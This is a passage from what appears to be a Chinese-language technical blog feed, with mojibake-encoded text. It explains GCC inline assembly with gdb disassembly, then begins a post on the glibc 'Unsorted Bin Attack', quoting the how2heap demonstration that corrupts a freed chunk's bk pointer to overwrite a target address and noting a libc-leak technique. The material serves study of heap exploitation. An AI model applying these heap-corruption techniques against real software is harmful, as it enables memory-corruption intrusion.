class="comment">//gdbæ”¹å˜æ±‡ç¼–é£æ ¼set disassembly-flavor intel | att</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322144433403.png" alt="image-20230322144433403"></p><p>è¿™æ ·æ’å…¥æ±‡ç¼–å¾ˆç®€å•ä½†æ˜¯gccå¹¶ä¸çŸ¥é“æˆ‘ä»¬æ”¹å˜äº†é‚£äº›å¯„å­˜å™¨çš„å€¼ï¼Œgccå¯èƒ½è¿›è¡ŒæŸäº›ä»£ç ä¼˜åŒ–æ—¶ï¼Œä¼šç”¨åˆ°è¿™äº›å¯„å­˜å™¨ä½†æ˜¯å®ƒé‡Œé¢çš„å€¼å·²ç»è¢«æˆ‘ä»¬æ’å…¥æ±‡ç¼–ä¿®æ”¹æ‰äº†ï¼Œå°±ä¼šå¯¼è‡´ä¸€äº›error</p><h2 id="Extended-Asm"><a href="#Extended-Asm" class="headerlink" title="Extended Asm"></a>Extended Asm</h2><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜å¹¶ä¸”å’Œcæœ‰ä¸ªæ›´å¥½çš„äº¤äº’ï¼Œå°±æœ‰äº†æ‹“å±•æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( assembler template </span><br><span class="line">         : output operands                  <span class="comment">/* optional */</span></span><br><span class="line">         : input operands                   <span class="comment">/* optional */</span></span><br><span class="line">         : <span class="built_in">list</span> of clobbered registers      <span class="comment">/* optional */</span></span><br><span class="line">         );</span><br></pre></td></tr></table></figure><h3 id="operands"><a href="#operands" class="headerlink" title="operands"></a>operands</h3><p>æ€»æ“ä½œæ•°çš„æ•°ç›®é™åˆ¶åœ¨ 10 ä¸ªï¼Œæˆ–è€…æœºå™¨æè¿°ä¸­çš„ä»»ä½•æŒ‡ä»¤æ ¼å¼ä¸­çš„æœ€å¤§æ“ä½œæ•°æ•°ç›®ï¼Œä»¥è¾ƒå¤§è€…ä¸ºå‡†ã€‚</p><p>åœ¨æ±‡ç¼–ç¨‹åºæ¨¡æ¿ä¸­ï¼Œæ¯ä¸ªæ“ä½œæ•°ç”¨æ•°å­—å¼•ç”¨ã€‚ç¼–å·æ–¹å¼ä»0å¼€å§‹ï¼Œä»ä¸Šå¾€ä¸‹</p><ul><li>rè¡¨ç¤ºæˆ‘ä»¬è®©gccè‡ªåŠ¨å¸®æˆ‘ä»¬å»é€‰æ‹©ä¸€ä¸ªè¾“å…¥å¯„å­˜å™¨ä¸€ä¸ªè¾“å‡ºå¯„å­˜å™¨</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;r&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322163200644.png" alt="image-20230322163200644"></p><ul><li>å¦‚æœæˆ‘ä»¬æƒ³è¦è¾“å…¥å’Œè¾“å‡ºæ”¾åœ¨åŒä¸€ä¸ªå¯„å­˜å™¨</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%0,%0,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;0&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><ul><li>æŒ‡å®šecxå¯„å­˜å™¨,ä¸ºäº†å’Œæ“ä½œæ•°è¿›è¡ŒåŒºåˆ†ï¼Œå¯„å­˜å™¨æˆ‘ä»¬é‡‡ç”¨ä¸¤ä¸ª%</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%%ecx,%%ecx,4), %%ecx&quot;</span></span><br><span class="line">     : <span class="string">&quot;=c&quot;</span> (x)</span><br><span class="line">     : <span class="string">&quot;c&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322162844426.png" alt="image-20230322162844426"></p><p>æˆ‘ä»¬æ²¡æœ‰å¾€list of clobbered registerså»æ·»åŠ å¯„å­˜å™¨ï¼Œå› ä¸ºç›®å‰æƒ…å†µgccçŸ¥é“æˆ‘ä»¬ç ´åäº†å“ªä¸ª,å› ä¸ºå®ƒä»¬è¢«æ˜¾å¼åœ°æŒ‡å®šä¸ºçº¦æŸäº†</p><h3 id="Clobber-List"><a href="#Clobber-List" class="headerlink" title="Clobber List"></a>Clobber List</h3><p><strong>å¦‚æœæŒ‡ä»¤éšå¼æˆ–æ˜¾å¼åœ°ä½¿ç”¨äº†ä»»ä½•å…¶ä»–å¯„å­˜å™¨ï¼Œï¼ˆå¹¶ä¸”å¯„å­˜å™¨æ²¡æœ‰å‡ºç°åœ¨è¾“å‡ºæˆ–è€…è¾“å‡ºçº¦æŸåˆ—è¡¨é‡Œï¼‰ï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨Clobber Listä¸­æŒ‡å®šè¿™äº›å¯„å­˜å™¨ã€‚</strong></p><p>å¦‚æœæˆ‘ä»¬çš„æŒ‡ä»¤å¯ä»¥ä¿®æ”¹æ¡ä»¶ç å¯„å­˜å™¨ï¼ˆccï¼‰ï¼Œæˆ‘ä»¬å¿…é¡»å°† â€œccâ€ æ·»åŠ è¿›ä¿®é¥°å¯„å­˜å™¨åˆ—è¡¨ã€‚</p><p>å¦‚æœæˆ‘ä»¬çš„æŒ‡ä»¤ä»¥ä¸å¯é¢„æµ‹çš„æ–¹å¼ä¿®æ”¹äº†å†…å­˜ï¼Œé‚£ä¹ˆéœ€è¦å°† â€œmemoryâ€ æ·»åŠ è¿›ä¿®é¥°å¯„å­˜å™¨åˆ—è¡¨ã€‚</p><h3 id="Volatileä¿®é¥°ç¬¦"><a href="#Volatileä¿®é¥°ç¬¦" class="headerlink" title="Volatileä¿®é¥°ç¬¦"></a>Volatileä¿®é¥°ç¬¦</h3><p>gccä¼šåœ¨sourceâ€“&gt;codeçš„è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œä¸€äº›ä¼˜åŒ–ï¼Œä¾‹å¦‚åˆ é™¤ä¸€äº›ä»£ç æ”¹å˜ä¸€äº›ä»£ç ä½ç½®ç­‰</p><p>ä¸ºäº†ä¸è®©gccå»ä¼˜åŒ–æˆ‘ä»¬çš„inline asmå°†å…³é”®è¯volatile æˆ–è€… __volatile__ æ”¾ç½®åœ¨ asm åé¢ã€()çš„å‰é¢ã€‚</p><h2 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h2><h3 id="å¯„å­˜å™¨çº¦æŸ"><a href="#å¯„å­˜å™¨çº¦æŸ" class="headerlink" title="å¯„å­˜å™¨çº¦æŸ"></a>å¯„å­˜å™¨çº¦æŸ</h3><p>â€œreg constraintsâ€(variable),è¾“å‡ºæ“ä½œæ•°è¿˜è¦æœ‰â€œ&#x3D;â€çš„çº¦æŸåœ¨â€&#x3D;reg constraintsâ€(variable)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br><span class="line"> q   eax, ebx, ecx, edx</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜æ“ä½œæ•°çº¦æŸ"><a href="#å†…å­˜æ“ä½œæ•°çº¦æŸ" class="headerlink" title="å†…å­˜æ“ä½œæ•°çº¦æŸ"></a>å†…å­˜æ“ä½œæ•°çº¦æŸ</h3><p>â€œmâ€(variable),ä½¿ç”¨memoryè€Œä¸æ˜¯regä½œä¸ºtempæ¥åšè¿ç®—</p><h3 id="åŒ¹é…ï¼ˆæ•°å­—ï¼‰çº¦æŸ"><a href="#åŒ¹é…ï¼ˆæ•°å­—ï¼‰çº¦æŸ" class="headerlink" title="åŒ¹é…ï¼ˆæ•°å­—ï¼‰çº¦æŸ"></a>åŒ¹é…ï¼ˆæ•°å­—ï¼‰çº¦æŸ</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå˜é‡å¯èƒ½æ—¢å……å½“è¾“å…¥æ“ä½œæ•°ï¼Œä¹Ÿå……å½“è¾“å‡ºæ“ä½œæ•°ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨åŒ¹é…çº¦æŸåœ¨ â€œasmâ€ ä¸­æŒ‡å®šè¿™ç§æƒ…å†µã€‚</p><p>asm (â€œincl %0â€ :â€&#x3D;aâ€(var):â€0â€(var));</p><h3 id><a href="#" class="headerlink" title="+"></a>+</h3><p>â€œ+â€å·ç”¨äºæŒ‡å®šä¸€ä¸ªæ“ä½œæ•°æ—¢å¯ä»¥ç”¨ä½œè¾“å…¥ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œè¾“å‡ºï¼Œå³è¾“å…¥&#x2F;è¾“å‡ºæ“ä½œæ•°ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;addl %[a], %[b]&quot;</span></span><br><span class="line">    : [b] <span class="string">&quot;+r&quot;</span> (b)</span><br><span class="line">    : [a] <span class="string">&quot;r&quot;</span> (a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>â€œ&amp;â€ : æ„å‘³ç€è¿™ä¸ªæ“ä½œæ•°ä¸ºä¸€ä¸ªæ—©æœŸæ”¹åŠ¨çš„æ“ä½œæ•°ï¼Œå…¶åœ¨è¯¥æŒ‡ä»¤å®Œæˆå‰é€šè¿‡ä½¿ç”¨è¾“å…¥æ“ä½œæ•°è¢«ä¿®æ”¹äº†ã€‚å› æ­¤ï¼Œè¿™ä¸ªæ“ä½œæ•°ä¸å¯ä»¥ä½äºä¸€ä¸ªè¢«ç”¨ä½œè¾“å‡ºæ“ä½œæ•°æˆ–ä»»ä½•å†…å­˜åœ°å€éƒ¨åˆ†çš„å¯„å­˜å™¨ã€‚å¦‚æœåœ¨æ—§å€¼è¢«å†™å…¥ä¹‹å‰å®ƒä»…ç”¨ä½œè¾“å…¥è€Œå·²ï¼Œä¸€ä¸ªè¾“å…¥æ“ä½œæ•°å¯ä»¥ä¸ºä¸€ä¸ªæ—©æœŸæ”¹åŠ¨æ“ä½œæ•°ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">10</span>, fill_value = <span class="number">0x6</span>;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;stosb\n\t&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)</span><br><span class="line">        : </span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dest[i]); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//cldå°†æ ‡å¿—å¯„å­˜å™¨Flagçš„æ–¹å‘æ ‡å¿—ä½DFæ¸…é›¶ã€‚DIçš„åœ°å€æŒ‡é’ˆè‡ªåŠ¨å¢åŠ </span></span><br><span class="line"><span class="comment">//repé‡æ–°rcxæ¬¡æ•°çš„stosbæŠŠalé‡Œé¢çš„æ•°æ®å¾€rdiæŒ‡å‘åœ°å€å»å†™</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153906189.png" alt="image-20230322153906189"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001169 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000116d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000116e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001171 &lt;+8&gt;:    sub    rsp,0x30</span><br><span class="line">0x0000000000001175 &lt;+12&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000000000000117e &lt;+21&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">0x0000000000001182 &lt;+25&gt;:    xor    eax,eax</span><br><span class="line">0x0000000000001184 &lt;+27&gt;:    mov    DWORD PTR [rbp-0x28],0xa</span><br><span class="line">0x000000000000118b &lt;+34&gt;:    mov    DWORD PTR [rbp-0x24],0x6</span><br><span class="line">0x0000000000001192 &lt;+41&gt;:    mov    QWORD PTR [rbp-0x12],0x0</span><br><span class="line">0x000000000000119a &lt;+49&gt;:    mov    WORD PTR [rbp-0xa],0x0</span><br><span class="line">0x00000000000011a0 &lt;+55&gt;:    mov    edx,DWORD PTR [rbp-0x28]</span><br><span class="line">0x00000000000011a3 &lt;+58&gt;:    mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">0x00000000000011a6 &lt;+61&gt;:    lea    rsi,[rbp-0x12]</span><br><span class="line">0x00000000000011aa &lt;+65&gt;:    mov    ecx,edx</span><br><span class="line">0x00000000000011ac &lt;+67&gt;:    mov    rdi,rsi</span><br><span class="line">0x00000000000011af &lt;+70&gt;:    cld                   </span><br><span class="line">0x00000000000011b0 &lt;+71&gt;:    rep stos BYTE PTR es:[rdi],al</span><br><span class="line">0x00000000000011b2 &lt;+73&gt;:    mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x00000000000011ba &lt;+81&gt;:    jmp    0x11e8 &lt;main+127&gt;</span><br><span class="line">0x00000000000011bc &lt;+83&gt;:    lea    rdx,[rbp-0x12]</span><br><span class="line">0x00000000000011c0 &lt;+87&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">0x00000000000011c4 &lt;+91&gt;:    add    rax,rdx</span><br><span class="line">0x00000000000011c7 &lt;+94&gt;:    movzx  eax,BYTE PTR [rax]</span><br><span class="line">0x00000000000011ca &lt;+97&gt;:    movsx  eax,al</span><br><span class="line">0x00000000000011cd &lt;+100&gt;:    mov    esi,eax</span><br><span class="line">0x00000000000011cf &lt;+102&gt;:    lea    rax,[rip+0xe2e]        # 0x2004</span><br><span class="line">0x00000000000011d6 &lt;+109&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000000011d9 &lt;+112&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011de &lt;+117&gt;:    call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">0x00000000000011e3 &lt;+122&gt;:    add    QWORD PTR [rbp-0x20],0x1</span><br><span class="line">0x00000000000011e8 &lt;+127&gt;:    cmp    QWORD PTR [rbp-0x20],0x9</span><br><span class="line">0x00000000000011ed &lt;+132&gt;:    jbe    0x11bc &lt;main+83&gt;</span><br><span class="line">0x00000000000011ef &lt;+134&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011f4 &lt;+139&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0x00000000000011f8 &lt;+143&gt;:    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">0x0000000000001201 &lt;+152&gt;:    je     0x1208 &lt;main+159&gt;</span><br><span class="line">0x0000000000001203 &lt;+154&gt;:    call   0x1060 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x0000000000001208 &lt;+159&gt;:    leave  </span><br><span class="line">0x0000000000001209 &lt;+160&gt;:    ret    </span><br></pre></td></tr></table></figure><p>ä¸€ç›´åˆ°+67å¤„åšå¥½å‡†å¤‡å·¥ä½œï¼Œå»æå‡å †æ ˆï¼Œåˆå§‹åŒ–å±€éƒ¨å˜é‡</p><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153828870.png" alt="image-20230322153828870"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a=<span class="number">10</span>, b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;mov %1, %%eax;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %%eax, %0;&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(b)       </span><br><span class="line">     :<span class="string">&quot;r&quot;</span>(a)        </span><br><span class="line">     :<span class="string">&quot;%eax&quot;</span>     </span><br><span class="line">     ); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322154308379.png" alt="image-20230322154308379"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001149 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000114d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000114e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001151 &lt;+8&gt;:    sub    rsp,0x10</span><br><span class="line">0x0000000000001155 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x8],0xa</span><br><span class="line">0x000000000000115c &lt;+19&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">0x0000000000001163 &lt;+26&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001166 &lt;+29&gt;:    mov    eax,eax</span><br><span class="line">0x0000000000001168 &lt;+31&gt;:    mov    eax,eax</span><br><span class="line">0x000000000000116a &lt;+33&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x000000000000116d &lt;+36&gt;:    mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">0x0000000000001170 &lt;+39&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001173 &lt;+42&gt;:    mov    esi,eax</span><br><span class="line">0x0000000000001175 &lt;+44&gt;:    lea    rax,[rip+0xe88]        # 0x2004</span><br><span class="line">0x000000000000117c &lt;+51&gt;:    mov    rdi,rax</span><br><span class="line">0x000000000000117f &lt;+54&gt;:    mov    eax,0x0</span><br><span class="line">0x0000000000001184 &lt;+59&gt;:    call   0x1050 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001189 &lt;+64&gt;:    mov    eax,0x0</span><br><span class="line">0x000000000000118e &lt;+69&gt;:    leave  </span><br><span class="line">0x000000000000118f &lt;+70&gt;:    ret    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Inline Asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="/2023/03/21/Unsorted-Bin-Attack/"/>
      <url>/2023/03/21/Unsorted-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="unsorted-bin-æ¥æº"><a href="#unsorted-bin-æ¥æº" class="headerlink" title="unsorted bin æ¥æº"></a>unsorted bin æ¥æº</h2><ol><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ã€‚</li></ol><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><ul><li>Unsorted Binåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ï¼Œå³æŒ‚è¿›é“¾è¡¨çš„æ—¶å€™ä¾æ¬¡ä»Unsorted binçš„å¤´éƒ¨å‘å°¾éƒ¨æŒ‚ï¼Œå–çš„æ—¶å€™æ˜¯ä»å°¾éƒ¨å‘å¤´éƒ¨å–</li><li>åœ¨ç¨‹åºmallocæ—¶ï¼Œå¦‚æœfast binã€small binä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„chunkï¼Œå°±ä¼šå°è¯•ä»Unsorted binä¸­å¯»æ‰¾chunkã€‚å¦‚æœå–å‡ºæ¥çš„chunkçš„sizeåˆšå¥½æ»¡è¶³ï¼Œåˆ™ç›´æ¥äº¤ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº›chunkåˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„binä¸­</li></ul><p>æˆ‘ä»¬ä¹‹å‰åšé¢˜æ—¶å…¶å®ä¹Ÿç”¨åˆ°äº†unsortedbinï¼Œå»è¿›è¡Œunlinkåˆæˆ–å»æ³„éœ²libcï¼Œå½“æ—¶æˆ‘å¹¶æ²¡æœ‰ç”¨libcserachï¼Œæ˜¯å› ä¸ºlibcsearchä¸æ”¯æŒmain_arenaç¬¦å·ï¼Œä½†æ˜¯æ˜¯æ”¯æŒ__malloc_hookçš„ï¼Œmallochookåˆåœ¨mainarena-0x10å¤„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨malloc_hookå»å®šä½libc</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>çœ‹ä¸€ä¸‹how2heapçš„ unsorted_bin_attack</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321151820498.png" alt="image-20230321151820498"></p><blockquote><p>è¿™é‡Œè¯´ä¸‹è¿™ä¸ªæŒ‡é’ˆé—®é¢˜</p><p>p[1] &#x3D; (unsigned long)(&amp;target_var - 2);</p><p>pçš„ç±»å‹æ˜¯ä¸€ä¸ªunsigned long *</p><p>tartget_varç±»å‹æ˜¯unsigned longï¼Œ&amp;åä¹Ÿæ˜¯unsigned long*</p><p>æ‰€ä»¥æ˜¯åœ¨(char *) p+0x8ä½ç½®å†™å…¥(char *)tartget_var-0x10</p></blockquote><p>ç°è±¡å°±æ˜¯æˆ‘ä»¬åœ¨freeæ‰påå°†pçš„bkæ”¹ä¸ºäº†target_var-0x10ä½ç½®ï¼Œè®©åæˆ‘ä»¬çš„target_varä½ç½®è¢«å†™å…¥äº†unsortedbinåœ°å€</p><p>å…·ä½“ä¸ºä»€ä¹ˆä¼šæˆ‘ä»¬å»ä¸‹æºç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">         unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p>æœ€å…³é”®çš„å°±æ˜¯è¿™å¥ï¼Œç”±äºunsortedbinæ˜¯fifoçš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬å†æ¬¡mallocä¼šæŠŠä¹‹å‰çš„chunkæ‹¿å‡ºæ¥ï¼Œå¹¶æ“ä½œé“¾è¡¨ç»“æ„</p><p>unsorted_chunks(av)æ˜¯ä¸€ä¸ªå‡½æ•°å®šä½åˆ°æˆ‘ä»¬unsortedbinä½ç½®ï¼ŒæŠŠä»–çš„bkæ”¹ä¸ºbckè¿™é‡Œçš„bckæ˜¯æˆ‘ä»¬è¦æ‹¿å‡ºchunkçš„bkä¹Ÿå°±æ˜¯æˆ‘ä»¬æ”¹é€ è¿‡çš„åœ°å€ï¼Œå†æŠŠæˆ‘ä»¬æ”¹é€ 